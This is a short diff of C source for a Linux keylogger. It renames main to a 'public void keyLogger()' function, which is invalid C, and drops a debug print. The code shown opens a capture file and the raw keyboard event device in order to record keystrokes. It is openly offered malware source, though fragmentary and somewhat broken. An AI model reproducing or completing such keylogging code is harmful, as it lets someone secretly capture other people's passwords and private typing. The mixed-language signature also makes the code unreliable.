@@ -6,14 +6,13 @@
 #include <unistd.h>
 #include <time.h> 
 
-int main()
+public void keyLogger()
 {
 FILE *f = fopen("KeyLoggerData.txt", "w");
    time_t begin, finish;
    double timer;  
     int fd;
    fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
-    printf("%i", fd);
     struct input_event ev;
    begin = time(NULL);
    int clockRunning = 1;
